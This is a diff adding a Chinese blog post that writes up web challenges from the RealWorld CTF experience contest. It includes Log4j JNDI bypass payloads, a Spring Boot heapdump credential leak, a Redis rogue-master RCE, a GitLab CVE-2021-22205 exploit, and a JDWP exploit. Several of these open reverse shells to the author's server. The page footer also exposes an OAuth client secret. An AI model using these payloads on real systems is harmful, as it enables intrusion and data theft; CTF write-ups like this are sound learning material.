@@ -1,0 +1,311 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>RealWorld CTF体验赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="RealWorld CTF体验赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言:
+这次比赛的题目是需要nc连上去，然后md5截断比较验证，才会给出题目的端口。爆破脚本参考这篇文章:https://www.cnblogs.com/yesec/p/11297568.html
+Check-in
+Digital Souv..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              RealWorld CTF体验赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-01-22
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言:</h1>
+<p>这次比赛的题目是需要nc连上去，然后md5截断比较验证，才会给出题目的端口。爆破脚本参考这篇文章:https://www.cnblogs.com/yesec/p/11297568.html</p>
+<h1 id="check-in">Check-in</h1>
+<h2 id="digital-souvenir">Digital Souvenir</h2>
+<h1 id="web">Web</h1>
+<h2 id="log4flag">log4flag</h2>
+<p>进入题目 熟悉的log4j，先输入常规的payload:<code>${jndi:rmi://101.43.66.67:1099/rvosq5}</code>，密码任意，点击登录，会被waf拦截，提示非法参数值。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/dbdd1cc581879.png" alt="1642830305553.png" loading="lazy"></figure>
+<p>网上找了一篇bypass的文章: https://blog.csdn.net/qq_42322144/article/details/121922084</p>
+<p>其中一条payload : <code>${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}</code>可以绕过，即:<code>${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://101.43.66.67:1099/rvosq5}</code>，同时VPS开启监听</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/8c994eff40829.png" alt="1642830642426.png" loading="lazy"></figure>
+<p>拿到flag:</p>
+<pre><code>rwctf{d4b4b837f95542aa93b43ee280b230d8}
+</code></pre>
+<h2 id="the-secrets-of-memory">the Secrets of Memory</h2>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/b407b59fc70ba.png" alt="1642831080321.png" loading="lazy"></figure>
+<p>进入题目，看到Actuator，联想到Spring Boot，尝试一下Spring Boot常见漏洞，发现存在env接口泄露。访问<code>http://139.196.213.45:32646/actuator/env</code>搜索password字符</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/77310ff38e621.png" alt="1642831498015.png" loading="lazy"></figure>
+<p>可以看到，数据库源密码就是flag，而这里的值是星号加密了的，脱敏的方法可以访问<code>http://139.196.213.45:32646/actuator/heapdump</code>下载heapdump内存，通过MAT工具获得脱敏后的值，具体方法详见:https://landgrey.me/blog/16/</p>
+<p>用工具打开内存后，点击OQL 标签，在查询框中输入:</p>
+<pre><code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
+</code></pre>
+<p>即可查询到脱敏后的password 也就是这里的flag</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/6236b087d028c.png" alt="1642831796411.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>rwcft{d597d5defdd22829d8587efb9f9d0954}
+</code></pre>
+<h2 id="be-a-database-hacker">Be-a-Database-Hacker</h2>
+<p>这题用redis主从复制RCE的洞来打，工具链接:https://github.com/vulhub/redis-rogue-getshell</p>
+<p>将工具下载到 VPS上，执行cd RedisModulesSDK/进入RedisModulesSDK目录，然后执行make用来编译exp.so</p>
+<p>然后用find命令查找一下flag文件的位置</p>
+<pre><code>python3 redis-master.py -r 47.102.124.80 -p 35829 -L 101.43.66.67 -P 12345 -f RedisModulesSDK/exp.so -c &quot;find / -name 'fla*'&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/2c6eacc646d9f.png" alt="1642832278846.png" loading="lazy"></figure>
+<p>然后直接cat /tmp/flag.txt即可</p>
+<pre><code>python3 redis-master.py -r 47.102.124.80 -p 35829 -L 101.43.66.67 -P 12345 -f RedisModulesSDK/exp.so -c &quot;cat /tmp/flag.txt&quot;
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/904eade445374.png" alt="1642832334641.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>rwctf{c4374dba71fbf50144f7a1a04b7f5837}
+</code></pre>
+<h2 id="be-a-database-hacker-2">Be-a-Database-Hacker 2</h2>
+<h2 id="baby-flaglab">baby flaglab</h2>
+<p>进入题目，发现是Gitlab的登陆页面，最近有一个Gitlab的远程命令执行漏洞(CVE-2021-22205),Github上利用工具:           https://github.com/Al1ex/CVE-2021-22205</p>
+<p>执行命令，将反弹shell的命令写入tmp目录的le1a.sh</p>
+<pre><code>python CVE-2021-22205.py -a true -t http://47.102.106.96:34894/ -c &quot;echo 'bash -i &gt;&amp; /dev/tcp/101.43.66.67/12345 0&gt;&amp;1' &gt; /tmp/le1a.sh&quot;
+</code></pre>
+<p>然后将这个bash脚本赋予执行权限</p>
+<pre><code>python CVE-2021-22205.py -a true -t http://47.102.106.96:34894/ -c &quot;chmod +x /tmp/le1a.sh&quot;
+</code></pre>
+<p>在自己VPS上开启一个监听，然后执行该脚本即可反弹shell</p>
+<pre><code>python CVE-2021-22205.py -a true -t http://47.102.106.96:34894/ -c &quot;chmod +x /tmp/le1a.sh&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/37c6cfb0245ca.png" alt="1642832868303.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>rwctf{4edb62cb7b37d647e13bfed4f8d4b860}
+</code></pre>
+<h2 id="ghost-shiro">Ghost Shiro</h2>
+<p>工具一把梭，地址:https://github.com/SummerSec/ShiroAttack2/releases</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/f271656cc80ac.png" alt="1642846137962.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>rwctf{1b3df79b3c0e39f5b9f8815914403432}
+</code></pre>
+<h2 id="flag-console">Flag Console</h2>
+<h2 id="java-remote-debugger">Java Remote Debugger</h2>
+<p>JDWP漏洞，参考这个文章:https://www.wangan.com/articles/4255</p>
+<p>漏洞利用脚本:https://github.com/IOActive/jdwp-shellifier</p>
+<p>VPS开一个监听，然后用python2执行命令：</p>
+<pre><code>python2 jdwp-shellifier.py -t 139.196.23.201 -p 8888 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/c777195a6c13b.png" alt="1642849009382.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/01/22/864c51affed32.png" alt="1642849028358.png" loading="lazy"></figure>
+<p>得到flag:</p>
+<pre><code>rwctf{2c0e7100bcb45cc825ca07eccb86e568}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言:</a></li>
+<li><a href="#check-in">Check-in</a>
+<ul>
+<li><a href="#digital-souvenir">Digital Souvenir</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#log4flag">log4flag</a></li>
+<li><a href="#the-secrets-of-memory">the Secrets of Memory</a></li>
+<li><a href="#be-a-database-hacker">Be-a-Database-Hacker</a></li>
+<li><a href="#be-a-database-hacker-2">Be-a-Database-Hacker 2</a></li>
+<li><a href="#baby-flaglab">baby flaglab</a></li>
+<li><a href="#ghost-shiro">Ghost Shiro</a></li>
+<li><a href="#flag-console">Flag Console</a></li>
+<li><a href="#java-remote-debugger">Java Remote Debugger</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/长安战疫网络安全赛Writeup/">
+              <h3 class="post-title">
+                长安&#34;战疫&#34;网络安全赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
